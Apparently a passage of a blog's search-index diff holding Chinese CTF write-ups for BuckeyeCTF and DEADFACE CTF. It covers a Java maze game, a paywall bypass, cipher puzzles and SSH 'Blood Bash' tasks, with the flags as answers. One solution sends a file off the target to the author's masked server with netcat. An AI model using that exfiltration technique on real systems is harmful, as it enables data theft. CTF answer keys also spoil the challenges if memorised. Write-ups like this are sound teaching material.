+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>}
+    };
+    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> rows;
+    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> cols;
+    <span class="keyword">private</span> <span class="keyword">final</span> JLabel movesLabel;
+    <span class="keyword">private</span> <span class="keyword">final</span> JButton resetButton;
+    <span class="keyword">private</span> <span class="keyword">final</span> JButton[][] buttons;
+    <span class="keyword">private</span> <span class="keyword">int</span> posRow;
+    <span class="keyword">private</span> <span class="keyword">int</span> posCol;
+    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> endRow;
+    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> endCol;
+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_MOVES = <span class="number">139</span>;
+    <span class="keyword">private</span> ArrayList&lt;Integer&gt; moveHistory;
+
+    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] arrstring)</span> <span class="keyword">throws</span> Exception </span>{
+        <span class="keyword">new</span> Buttons();
+    }
+
+    <span class="function"><span class="keyword">public</span> <span class="title">Buttons</span><span class="params">()</span> </span>{
+        <span class="keyword">super</span>(<span class="string">"Buttons!"</span>);
+        <span class="keyword">this</span>.resetValues();
+        <span class="keyword">this</span>.rows = grid.length;
+        <span class="keyword">this</span>.cols = grid[<span class="number">0</span>].length;
+        <span class="keyword">this</span>.endRow = <span class="keyword">this</span>.rows - <span class="number">1</span>;
+        <span class="keyword">this</span>.endCol = <span class="keyword">this</span>.cols - <span class="number">2</span>;
+        JPanel jPanel = <span class="keyword">new</span> JPanel();
+        jPanel.setLayout(<span class="keyword">new</span> BoxLayout(jPanel, <span class="number">3</span>));
+        JPanel jPanel2 = <span class="keyword">new</span> JPanel(<span class="keyword">new</span> GridLayout(<span class="keyword">this</span>.rows, <span class="keyword">this</span>.cols));
+        JPanel jPanel3 = <span class="keyword">new</span> JPanel();
+        <span class="keyword">this</span>.buttons = <span class="keyword">new</span> JButton[<span class="keyword">this</span>.rows][<span class="keyword">this</span>.cols];
+        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.rows; ++i) {
+            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="keyword">this</span>.cols; ++j) {
+                <span class="keyword">this</span>.buttons[i][j] = <span class="keyword">new</span> JButton(<span class="string">"?"</span>);
+
+                  <span class="keyword">if</span>(<span class="keyword">this</span>.grid[i][j] == <span class="number">0</span>) {
+                                  <span class="keyword">this</span>.buttons[i][j].setText(<span class="string">"\u2691"</span>);
+                                }
+
+                <span class="keyword">this</span>.buttons[i][j].addActionListener(<span class="keyword">this</span>);
+                <span class="keyword">this</span>.buttons[i][j].setActionCommand(Integer.toString(j + i * <span class="keyword">this</span>.cols));
+                jPanel2.add(<span class="keyword">this</span>.buttons[i][j]);
+            }
+        }
+        <span class="keyword">this</span>.buttons[<span class="keyword">this</span>.endRow][<span class="keyword">this</span>.endCol].setText(<span class="string">"\u2691"</span>);
+        jPanel2.setPreferredSize(<span class="keyword">new</span> Dimension(<span class="number">45</span> * <span class="keyword">this</span>.rows, <span class="number">45</span> * <span class="keyword">this</span>.cols));
+        <span class="keyword">this</span>.movesLabel = <span class="keyword">new</span> JLabel(<span class="string">"Moves left: 20"</span>);
+        jPanel3.add(<span class="keyword">this</span>.movesLabel);
+        <span class="keyword">this</span>.resetButton = <span class="keyword">new</span> JButton(<span class="string">"Reset"</span>);
+        <span class="keyword">this</span>.resetButton.addActionListener(<span class="keyword">this</span>);
+        <span class="keyword">this</span>.resetButton.setActionCommand(<span class="string">"reset"</span>);
+        jPanel3.add(<span class="keyword">this</span>.resetButton);
+        jPanel.add(jPanel2);
+        jPanel.add(jPanel3);
+        <span class="keyword">this</span>.resetGUI();
+        <span class="keyword">this</span>.getContentPane().add(jPanel);
+        <span class="keyword">this</span>.pack();
+        <span class="keyword">this</span>.setDefaultCloseOperation(<span class="number">3</span>);
+        <span class="keyword">this</span>.setVisible(<span class="keyword">true</span>);
+    }
+
+    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">resetValues</span><span class="params">()</span> </span>{
+        <span class="keyword">this</span>.posRow = <span class="number">0</span>;
+        <span class="keyword">this</span>.posCol = <span class="number">1</span>;
+        <span class="keyword">this</span>.moveHistory = <span class="keyword">new</span> ArrayList();
+        <span class="keyword">this</span>.moveHistory.add(<span class="keyword">this</span>.posCol + <span class="keyword">this</span>.posRow * <span class="keyword">this</span>.cols);
+    }
+
+    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">updateMovesLeft</span><span class="params">()</span> </span>{
+        <span class="keyword">this</span>.movesLabel.setText(<span class="string">"Moves left: "</span> + Integer.toString(<span class="number">139</span> - <span class="keyword">this</span>.moveHistory.size()));
+    }
+
+    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">resetGUI</span><span class="params">()</span> </span>{
+        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.rows; ++i) {
+            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="keyword">this</span>.cols; ++j) {
+                <span class="keyword">this</span>.buttons[i][j].setEnabled(<span class="keyword">true</span>);
+            }
+        }
+        <span class="keyword">for</span> (<span class="keyword">int</span> j : <span class="keyword">this</span>.moveHistory) {
+            <span class="keyword">int</span> n = j / <span class="keyword">this</span>.cols;
+            <span class="keyword">int</span> n2 = j % <span class="keyword">this</span>.cols;
+            <span class="keyword">this</span>.buttons[n][n2].setEnabled(<span class="keyword">false</span>);
+        }
+        <span class="keyword">this</span>.updateMovesLeft();
+    }
+
+    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reset</span><span class="params">()</span> </span>{
+        <span class="keyword">this</span>.resetValues();
+        <span class="keyword">this</span>.resetGUI();
+    }
+
+    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isLegalMove</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> n2)</span> </span>{
+        <span class="keyword">if</span> (<span class="number">139</span> - <span class="keyword">this</span>.moveHistory.size() &lt;= <span class="number">0</span>) {
+            <span class="keyword">return</span> <span class="keyword">false</span>;
+        }
+        <span class="keyword">return</span> grid[n][n2] == <span class="number">0</span> &amp;&amp; Math.abs(n - <span class="keyword">this</span>.posRow) + Math.abs(n2 - <span class="keyword">this</span>.posCol) == <span class="number">1</span>;
+    }
+
+    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">printFlag</span><span class="params">()</span> </span>{
+        BigInteger bigInteger;
+        BigInteger[] arrbigInteger = <span class="keyword">new</span> BigInteger[<span class="keyword">this</span>.moveHistory.size()];
+        arrbigInteger[<span class="number">0</span>] = BigInteger.valueOf(<span class="number">2L</span>);
+        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arrbigInteger.length; ++i) {
+            arrbigInteger[i] = arrbigInteger[i - <span class="number">1</span>].nextProbablePrime();
+        }
+        BigInteger bigInteger2 = BigInteger.valueOf(<span class="number">1L</span>);
+        BigInteger bigInteger3 = <span class="keyword">new</span> BigInteger(<span class="string">"1430313837704837266267655033918654049072573502772041995300810633148485540425442305963378206448908414865491202671058946396326575688430628383447817933039379"</span>);
+        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.moveHistory.size(); ++i) {
+            bigInteger = BigInteger.valueOf(<span class="keyword">this</span>.moveHistory.get(i).intValue());
+            bigInteger2 = bigInteger2.multiply(arrbigInteger[i].modPow(bigInteger, bigInteger3)).mod(bigInteger3);
+        }
+        BigInteger bigInteger4 = <span class="keyword">new</span> BigInteger(<span class="string">"1181624346478884506978387685027501257422054115549381320819711748725513305918055802813085700551988448885328987653245675378090761255233757606571908411691314"</span>);
+        bigInteger = bigInteger4.multiply(bigInteger2).mod(bigInteger3);
+        <span class="keyword">byte</span>[] arrby = bigInteger.toByteArray();
+        String string = <span class="keyword">new</span> String(arrby, StandardCharsets.UTF_8);
+        JOptionPane.showMessageDialog(<span class="keyword">this</span>, <span class="string">"Congrats! The flag is: "</span> + string, <span class="string">"Flag"</span>, <span class="number">1</span>);
+        System.out.println(string);
+    }
+
+    <span class="meta">@Override</span>
+    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent actionEvent)</span> </span>{
+        String string = actionEvent.getActionCommand();
+        <span class="keyword">if</span> (string.equals(<span class="string">"reset"</span>)) {
+            <span class="keyword">this</span>.reset();
+        } <span class="keyword">else</span> {
+            <span class="keyword">int</span> n;
+            <span class="keyword">int</span> n2 = Integer.parseInt(string);
+            <span class="keyword">int</span> n3 = n2 / <span class="keyword">this</span>.cols;
+            <span class="keyword">if</span> (<span class="keyword">this</span>.isLegalMove(n3, n = n2 % <span class="keyword">this</span>.cols)) {
+                <span class="keyword">this</span>.buttons[n3][n].setEnabled(<span class="keyword">false</span>);
+                <span class="keyword">this</span>.posRow = n3;
+                <span class="keyword">this</span>.posCol = n;
+                <span class="keyword">this</span>.moveHistory.add(n2);
+                System.out.println(<span class="keyword">this</span>.moveHistory);
+                <span class="keyword">this</span>.updateMovesLeft();
+                <span class="keyword">if</span> (<span class="keyword">this</span>.posRow == <span class="keyword">this</span>.endRow &amp;&amp; <span class="keyword">this</span>.posCol == <span class="keyword">this</span>.endCol) {
+                    <span class="keyword">this</span>.printFlag();
+                }
+            } <span class="keyword">else</span> {
+                JOptionPane.showMessageDialog(<span class="keyword">this</span>, <span class="string">"Illegal move, you lose \u2639"</span>, <span class="string">"Illegal move"</span>, <span class="number">0</span>);
+                <span class="keyword">this</span>.reset();
+            }
+        }
+    }
+}
+</code></pre>
+<p><strong>flag:</strong><code>buckeye{am4z1ng_j0b_y0u_b1g_j4va_h4ck3r}</code></p>
+<h1 id="pay2win"><a href="#pay2win" class="headerlink" title="pay2win"></a>pay2win</h1><p><em>Kyle started an online magazine (The Daily Kyle) and published one of my articles on his site. Don’t worry, the article literally contains the flag in plaintext, but if you want to read it you’ll have to figure out how to bypass the paywall.</em></p>
+<p><em>URL: <a href="https://pay2win.chall.pwnoh.io" target="_blank" rel="noopener">https://pay2win.chall.pwnoh.io</a></em></p>
+<hr>
+<p>查看网页源代码,发现<code>plantFlag</code>函数,粘贴到Console中运行后,打印出<code>shwl_l1_twcd14}1ry4ht3neck_t3_bs{1c_hkh_tsh3he03gy_3l_hu</code>.</p>
+<pre><code class="javascript"><span class="keyword">const</span> ciphertext = [
+    <span class="number">234</span>, <span class="number">240</span>, <span class="number">234</span>, <span class="number">252</span>, <span class="number">214</span>, <span class="number">236</span>, <span class="number">140</span>, <span class="number">247</span>, <span class="number">173</span>, <span class="number">191</span>, <span class="number">158</span>, <span class="number">132</span>, <span class="number">56</span>, <span class="number">4</span>, <span class="number">32</span>, <span class="number">73</span>, <span class="number">235</span>, <span class="number">193</span>, <span class="number">233</span>, <span class="number">152</span>,
+    <span class="number">125</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">237</span>, <span class="number">186</span>, <span class="number">131</span>, <span class="number">98</span>, <span class="number">52</span>, <span class="number">186</span>, <span class="number">143</span>, <span class="number">127</span>, <span class="number">43</span>, <span class="number">226</span>, <span class="number">233</span>, <span class="number">126</span>, <span class="number">15</span>, <span class="number">225</span>, <span class="number">171</span>, <span class="number">85</span>, <span class="number">55</span>,
+    <span class="number">173</span>, <span class="number">123</span>, <span class="number">21</span>, <span class="number">147</span>, <span class="number">97</span>, <span class="number">21</span>, <span class="number">237</span>, <span class="number">11</span>, <span class="number">254</span>, <span class="number">129</span>, <span class="number">2</span>, <span class="number">131</span>, <span class="number">101</span>, <span class="number">63</span>, <span class="number">149</span>, <span class="number">61</span>,
+];
+<span class="keyword">const</span> plaintext = ciphertext.map(<span class="function">(<span class="params">x, i</span>) =&gt;</span> (i * i) % <span class="number">256</span> ^ x ^ <span class="number">0x99</span>);
+
+<span class="keyword">const</span> flagElement = <span class="built_in">document</span>.querySelector(<span class="string">"#flag"</span>);
+plaintext.map(<span class="function">(<span class="params">x, i</span>) =&gt;</span> {
+    <span class="keyword">const</span> span = <span class="built_in">document</span>.createElement(<span class="string">"span"</span>);
+    span.classList.add(<span class="string">`flag-char-<span class="subst">${i}</span>`</span>);
+    span.textContent = <span class="built_in">String</span>.fromCharCode(x);
+    flagElement.appendChild(span);
+    <span class="keyword">return</span> span;
+});
+</code></pre>
+<p>查看<code>main.css</code>,发现<code>span</code>都被设置了<code>order</code>属性.</p>
+<p>我们可以把<code>main.css</code>,<code>main.js</code>和网页源代码<code>a.html</code>下载到本地.然后注释掉<code>main.js</code>里弹窗和阻止滚动的代码.</p>
+<p>打开<code>a.html</code>,发现本应该显示<code>flag</code>的地方有一个灰色的框.</p>
+<p>编辑<code>a.html</code>,将 <code>&lt;code id=&quot;flag&quot;&gt;&lt;/code&gt;</code>这一行代码移动至<code>&lt;pre&gt;</code>标签外面,即可看到<code>flag</code>.</p>
+<p><img data-src="../../CTF/BuckeyeCTF2021/Web/images/pay2win.jpg" alt="pay2win"></p>
+<p><strong>flag:</strong><code>buckeye{h0ly_sh1t_wh4t_th3_h3ck_1s_th1s_w31rd_ch4ll3ng3}</code></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
         <category>CTF</category>
       </categories>
@@ -98,7 +943,439 @@
   <entry>
     <title>DEADFACECTF Writeup</title>
     <url>/posts/2879210530/</url>
-    <content><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+    <content><![CDATA[<h1 id="Poor-MEAGAN"><a href="#Poor-MEAGAN" class="headerlink" title="Poor MEAGAN!"></a>Poor MEAGAN!</h1><p><em>Oh, NO! Poor Megan! She’s just been bitten by a ZOMBIE! We can save her if we act fast, but the formula for the antidote has been scrambled somehow. Figure out how to unscramble &gt;the formula to save Megan from certain zombification. Enter the answer as flag{here-is-the-answer}.</em></p>
+<p><em>The formula for the antidote: j2rXjx9dkhW9eLKsnMR9cLDVjh/9dwz1QfGXm+b9=wKslL1Zpb45</em></p>
+<hr>
+<p>看起来像一个base64字符串,但是似乎被混淆了,使用<a href="https://gchq.github.io/CyberChef/#recipe=From_Base64(&#39;3GHIJKLMNOPQRSTUb%3DcdefghijklmnopWXYZ/12%2B406789VaqrstuvwxyzABCDEF5&#39;,true" target="_blank" rel="noopener">CyberChef</a>&amp;input=ajJyWGp4OWRraFc5ZUxLc25NUjljTERWamgvOWR3ejFRZkdYbStiOT13S3NsTDFacGI0NQ)搭配Megan35解码即可</p>
+<p><img data-src="../../CTF/DEADFACECTF/Crypto/images/Poor_Meagan.png" alt="CyberChef"></p>
+<p><strong>flag:</strong><code>flag{Six-Parts-Honey-One-Part-Garlic}</code></p>
+<a id="more"></a>
+<h1 id="To-Be-Xor-Not-to-Be"><a href="#To-Be-Xor-Not-to-Be" class="headerlink" title="To Be Xor Not to Be"></a>To Be Xor Not to Be</h1><p><em>.$)/3&lt;’e-)&lt;e’:e&amp;’&lt;e&lt;’e-)&lt;5</em></p>
+<p><em>Submit the flag as flag{here-is-the-answer}</em></p>
+<hr>
+<p>直接使用<a href="https://gchq.github.io/CyberChef/#recipe=XOR_Brute_Force(1,100,0,&#39;Standard&#39;,false,true,false,&#39;flag&#39;" target="_blank" rel="noopener">CyberChef</a>&amp;input=LiQpLzM8J2UtKTxlJzplJic8ZTwnZS0pPDU)里的XOR Brute Force即可:</p>
+<p><img data-src="../../CTF/DEADFACECTF/Crypto/images/To_Be_Xor_Not_to_Be.png" alt="To_Be_Xor_Not_to_Be"></p>
+<p><strong>flag:</strong><code>flag{to-eat-or-not-to-eat}</code></p>
+<h1 id="Blood-Bash"><a href="#Blood-Bash" class="headerlink" title="Blood Bash"></a>Blood Bash</h1><p><em>We’ve obtained access to a system maintained by bl0ody_mary. There are five flag files that we need you to read and submit. Submit the contents of flag1.txt.</em></p>
+<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>
+<p><em>bloodbash.deadface.io:22</em></p>
+<hr>
+<p>使用<code>ssh</code>命令连接,<code>ls - R</code>后发现<code>Documents</code>目录下有一个<code>flag.txt</code>文件,直接<code>cat</code>即可.</p>
+<pre><code class="shell">╭─ ~/CTF/DEADFACECTF
+╰─$ ssh bl0ody_mary@bloodbash.deadface.io
+bl0ody_mary@bloodbash.deadface.io&#39;s password: 
+bl0ody_mary@16ef1481fce1:~$ ls -R
+.:
+&#39;De Monne Customer Portal.pdf&#39;   Documents   Downloads   Music   Pictures   Videos
+
+./Documents:
+flag1.txt
+
+./Downloads:
+
+./Music:
+
+./Pictures:
+
+./Videos:
+bl0ody_mary@16ef1481fce1:~$ cat Documents/flag1.txt
+flag{cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe}
+</code></pre>
+<p><strong>flag:</strong><code>flag{cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe}</code></p>
+<h1 id="Blood-Bash-2"><a href="#Blood-Bash-2" class="headerlink" title="Blood Bash 2"></a>Blood Bash 2</h1><p><em>We’ve obtained access to a system maintained by bl0ody_mary. We believe bl0ody_mary stole a sensitive document and is storing it on her Linux machine. Search her system for any files relating to De Monne Financial.</em></p>
+<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>
+<p><em>bloodbash.deadface.io:22</em></p>
+<hr>
+<p>在<code>Documents</code>目录<code>ls -a</code>后发现存在文件<code>.demonne_info.txt</code>,<code>cat</code>即可</p>
+<pre><code class="shell">bl0ody_mary@16ef1481fce1:~$ ls -a
+.  ..  flag.txt  .demonne_info.txt
+bl0ody_mary@16ef1481fce1:~$ cat .demonne_info.txt
+flag{a856b162978fe563537c6890cb184c48fc2a018a}
+</code></pre>
+<p><strong>flag:</strong><code>flag{a856b162978fe563537c6890cb184c48fc2a018a}</code></p>
+<h1 id="Blood-Bash-3"><a href="#Blood-Bash-3" class="headerlink" title="Blood Bash 3"></a>Blood Bash 3</h1><p><em>There’s a flag on this system that we’re having difficulty with. Unlike the previous flags, we can’t seem to find a file with this flag in it. Perhaps the flag isn’t stored in a traditional file?</em></p>
+<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>
+<p><em>bloodbash.deadface.io:22</em></p>
+<hr>
+<p>在Unix/Linux系统中“一切皆文件”,socket也被认为是一种文件.</p>
+<p>题意提示我们flag没有被存储在传统文件中,运行<code>netstat -ano</code></p>
+<pre><code class="shell">bl0ody_mary@5349049d19cd:~$ netstat -ano
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
+udp        0      0 127.0.0.1:43526         0.0.0.0:*                           off (0.00/0/0)
+</code></pre>
+<p>注意到有本地43526端口的监听(UDP),用<code>nc</code>连接一下</p>
+<pre><code class="shell">bl0ody_mary@16ef1481fce1:~$ nc -u 127.0.0.1 43526
+flag{open_port(al)s}
+</code></pre>
+<p><strong>flag:</strong><code>flag{open_port(al)s}</code></p>
+<h1 id="Blood-Bash-4"><a href="#Blood-Bash-4" class="headerlink" title="Blood Bash 4"></a>Blood Bash 4</h1><p><em>A sensitive file from De Monne was exfiltrated by mort1cia. It contains data relating to a new web portal they’re creating for their consumers. Read the contents of the file and return the flag as <code>flag{flag_goes_here}</code>.</em></p>
+<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>
+<p><em>bloodbash.deadface.io:22</em></p>
+<hr>
+<p>测试后发现无法使用<code>curl</code>,只有<code>nc</code>可以使用.</p>
+<p><code>nc</code>也可以用来传输文件,首先在自己的VPS上使用<code>nc</code>监听6379端口,准备接收文件</p>
+<pre><code class="shell">root@VM-8-4-centos: ~$ nc -l 8000 &gt; a.pdf
+</code></pre>
+<p>在比赛的服务器上用<code>nc</code>发送文件</p>
+<pre><code class="shell">bl0ody_mary@5349049d19cd:~$ nc -w 10 xx.xx.xxx.xxx 8000 &lt; De\ Monne\ Customer\ Portal.pdf
+</code></pre>
+<p>下载pdf文件并打开,即可看到flag</p>
+<p><img data-src="../../CTF/DEADFACECTF/Forensics/images/Blood_Bash4.png" alt="Blood Bash 4"></p>
+<h2 id="另一种解法"><a href="#另一种解法" class="headerlink" title="另一种解法"></a>另一种解法</h2><p>在比赛的服务器上使用<code>base64</code>命令将文件编码,复制后保存至本地文件<code>encoded</code></p>
+<pre><code class="shell">~$ base64 De\ Monne\ Customer\ Portal.pdf
+JVBERi0xLjYNJeLjz9MNCjExIDAgb2JqDTw8L0xpbmVhcml6ZWQgMS9MIDEyNDQ0L08gMTMvRSA4
+MjgyL04gMS9UIDEyMTQxL0ggWyA0MzggMTQ1XT4+DWVuZG9iag0gICAgICAgICAgICAgICAgICAg
+DQoxNiAwIG9iag08PC9EZWNvZGVQYXJtczw8L0NvbHVtbnMgMy9QcmVkaWN0b3IgMTI+Pi9GaWx0
+ZXIvRmxhdGVEZWNvZGUvSURbPDAyRjM1ODk5M0MxRDE0NEU4Q0Y2RDJGMkEyNzlBQzRGPjwxRUIy
+RkIxOTI5MURDRDREOTgzOTc3MTU5QzlBNzU5Nj5dL0luZGV4WzExIDddL0luZm8gMTAgMCBSL0xl
+bmd0aCAzNi9QcmV2IDEyMTQyL1Jvb3QgMTIgMCBSL1NpemUgMTgvVHlwZS9YUmVmL1dbMSAyIDBd
+Pj5zdHJlYW0NCmjeYmJkEGBiYDJnYmDwYWJg3AWkS5gY/m4Gsp0AAgwAI6cDxw0KZW5kc3RyZWFt
+DWVuZG9iag1zdGFydHhyZWYNCjANCiUlRU9GDQogICAgICAgIA0KMTcgMCBvYmoNPDwvRmlsdGVy
+L0ZsYXRlRGVjb2RlL0kgODIvTGVuZ3RoIDYxL08gNjYvUyAzNj4+c3RyZWFtDQpo3mJgYGBmYGBi
+YgAC2eMMmICFgQOJxwzFDAwlDLxMBgwWXiA2IwODQjSEZrgD1sOgNw3KvwkQYACjPAUuDQplbmRz
+dHJlYW0NZW5kb2JqDTEyIDAgb2JqDTw8L01ldGFkYXRhIDIgMCBSL091dGxpbmVzIDYgMCBSL1Bh
+Z2VzIDkgMCBSL1R5cGUvQ2F0YWxvZz4+DWVuZG9iag0xMyAwIG9iag08PC9Db250ZW50cyAxNCAw
+IFIvQ3JvcEJveFswLjAgMC4wIDYxMi4wIDc5Mi4wXS9NZWRpYUJveFswLjAgMC4wIDYxMi4wIDc5
+Mi4wXS9QYXJlbnQgOSAwIFIvUmVzb3VyY2VzPDwvUHJvY1NldFsvUERGL0ltYWdlQ10vWE9iamVj
+dDw8L0ltMCAxNSAwIFI+Pj4+L1JvdGF0ZSAwL1R5cGUvUGFnZT4+DWVuZG9iag0xNCAwIG9iag08
+PC9MZW5ndGggNjY+PnN0cmVhbQ0KcQoyNzMuMDIwMDE5NSAwIDAgMzQuMTk5OTk2OSAxNjEuNzcw
+NjkwOSA3MjQuMDk3Nzc4MyBjbQovSW0wIERvClEKDQplbmRzdHJlYW0NZW5kb2JqDTE1IDAgb2Jq
+DTw8L0JpdHNQZXJDb21wb25lbnQgOC9Db2xvclNwYWNlL0RldmljZVJHQi9GaWx0ZXIvRENURGVj
+b2RlL0hlaWdodCA1Ny9MZW5ndGggNzE1OC9OYW1lL1gvU3VidHlwZS9JbWFnZS9UeXBlL1hPYmpl
+Y3QvV2lkdGggNDU1Pj5zdHJlYW0NCv/Y/+4ADkFkb2JlAGQAAAAAAf/bAMUADAgICAgIDAgIDBAL
+CwsMDw4NDQ4UEg4OExMSFxQSFBQaGxcUFBseHicbFCQnJycnJDI1NTUyOzs7Ozs7Ozs7OwENCgoM
+CgwODAwOEQ4ODA0RFBQPDxEUEBEYERAUFBMUFRUUExQVFRUVFRUVGhoaGhoaHh4eHh4jIyMjJycn
+LCwsAg0KCgwKDA4MDA4RDg4MDREUFA8PERQQERgREBQUExQVFRQTFBUVFRUVFRUaGhoaGhoeHh4e
+HiMjIyMnJycsLCz/3QAEAB3/wAARCAA5AccDACIAAREBAhEC/8QBogABAAMAAQQDAAAAAAAAAAAA
+AAUGBwIBAwQICQoLAQEAAQEJAAAAAAAAAAAAAAAAAQIDBAUGBwgJCgsQAAADAwMDBAxZLQAAAAAA
+AAECAwAEEQUGEgcTIRQxMkEVFiIjNkJRYXWBk7IICQoXGBkaJCUmJygpKjM0NTc4OTpDREVGR0hJ
+SlJTVFVWV1hZWmJjZGVmZ2hpanFyc3R2d3h5eoKDhIWGh4iJipGSlJWWl5iZmqGio6Slpqeoqaqx
+s7S1tre4ubrBwsPExcbHyMnK0dLT1NXW19jZ2uHi4+Tl5ufo6erw8fLz9PX29/j5+hEAAAECBAQH
+cx0AAAAAAAAAAQACESExQQMSUWETQkNxgdHwBAUGBwgJChQVFhcYGRoiIyQlJicoKSoyMzQ1Njc4
+OTpERUZHSElKUlNUVVZXWFlaYmNkZWZnaGlqcnN0dXZ3eHl6goOEhYaHiImKkZKTlJWWl5iZmqGi
+o6SlpqeoqaqxsrO0tba3uLm6wcLDxMXGx8jJ8crS09TV1tfY2drh4uPk5ebn6Onq8vP09fb3+Pn6
+/9oADAMAAAERAhEAPwDVWMYwhGN213h3dUjLvSpEUiXJRQwEIG/iIgAN4rpLsiSgY5HCUHV6MmQT
+nKiukqJShbmGiYYBh2c4hecxoq9smtsMyf06d/ijSlvZBhC6sYxhCMYxhCMY3E5yJkMooYCEIUTG
+MYYFAAsiIjhGKELkxqc5VVJtyjLKUiuCb2uo8LgimuVMhUBEcGvpUp6O/ljhmuLFgFYSLiC4EY3F
+RRNJMyqpgIQhRMc5hApSgFkRERsAAA3ac39xlFG1EnvCT2jSEtcQORYlILcIlEQjZYQu+xjGEIxj
+GEIxjGEIxjGEIxjGEIxjGEIxjGEIxjGEIxjcVFE0kzKqmAhCFExzmEClKAWRERGwAADCFyY3Yc39
+xlFG1EnvCT2jSEtcQORYlILcIlEQjZbvsIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRj
+GMIRjUvJ2JsJyqeSXsj06nSXOgdZVNOslMQwkEREqpzQiFvRa5gIGADFGICEQELIMBMAEFBXIoIg
+uCxdWMYwhf/Q1VjGg5zu07XlN3Caj27OhymPagXoKQGAQCjRv0rdxwjBSIVLlRzGfVUleQpQVUCS
+5IQpigQRKBjABKVtbCJlLI28AgDXOSZkTYkJZV4kpyrCi6BkFBrq6kUzCAiW+1DQuIWzZpIjnPo8
++ZWQcH50TlgiQi+LqFi7nLFKwUKwbChgoNpc2HadzsV4va3t2ezGElp7ShRAoBSp0r8pW9iFuw0I
+wNbmCIi1E4RAXcBIcMZnNjgAAaIACDyVBqpzTm9IEkuT1JDmV1VUfQTOYplDRLQOaEDHMFuUG1lP
+PMvAQ8hs9q16ALhiRDytRtCTzzLwEPIaQlUbiDvJhDpWMtwd6LwJbl+SJuuxHyWV7TIqKAkU9BRW
+JhATAEEynG2KN03iyTPSa0trA7ybKKSqxrikamiobDFKoUgiNi6BvGnnL805GdkiTmRTfBOInQdT
+IkelBEL5E4FPfJbeEREGzKeErzSf3EjzIUivUkP6KyZ0XkqJHVESxERAa2pABthAQCOHakBapgiA
+JLLPKZSg8JCq87stwEQAIjYAGrylUOZiT5aA8qJV6nQEQKqZIBtrKgEFMAw9KDRc85ZeiVNRfwNB
+d+c3QihgsZ+AJXLaFuAiDcpmTJm2E1XE75J7u9rPjqRdZZZMqisVigeAGEBEoAAwCEMLbtUgICe0
+YZwGi3EURySAFACAgYK54IuweErE5TikaUZSeJIcnkFnt0KBl0ylUACgMAjSEoEG5BbCLdudaKjx
+NiVUErmeT3kCwt40DDBqJU4ciSdPyX3BM5jpuyR0kzHETGoFVIBQEREYwAABp+f7hO56SOrJD0BZ
+JTdDC+uaZyoPatETGPQUFBSESQC3xQtQegLDNGmjDEURUBFFMWyTcpMRBiHBSh4AgCooIDk02xcK
+kR0TzNSKkUCnI9PBVRAAATGpUgEcKNEQBre+PjpJ7sd8fliO6CQROooIFIAb+LVqpmtIq01khkRF
